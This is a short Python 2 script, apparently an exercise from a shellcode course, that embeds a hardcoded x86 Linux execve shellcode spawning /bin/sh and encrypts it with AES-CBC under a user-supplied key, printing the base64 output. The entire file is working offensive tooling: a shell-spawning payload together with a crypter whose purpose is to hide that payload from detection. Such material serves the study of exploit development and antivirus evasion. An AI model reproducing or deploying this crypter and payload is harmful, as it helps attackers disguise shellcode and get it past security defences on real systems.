#!/usr/bin/python
# Python AES Crypter
# Author: SLAE-935
#
# Usage: python Enctypt.py 16bytesKey
# Ex: python Encrypt.py AABBCCDDAABBCCDD

import base64, re
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(key):
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" # Execve-stack shellcode
    shellcode = shellcode + '\0' * (32 - len(shellcode) % 32)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(shellcode))

if __name__ == "__main__":
    key = raw_input("Please enter encryption Key - 16 bytes \n")
    while (len(key) != 16 ):
        key = raw_input("Please enter encryption Key - 16 bytes \n")
    print encrypt(key)
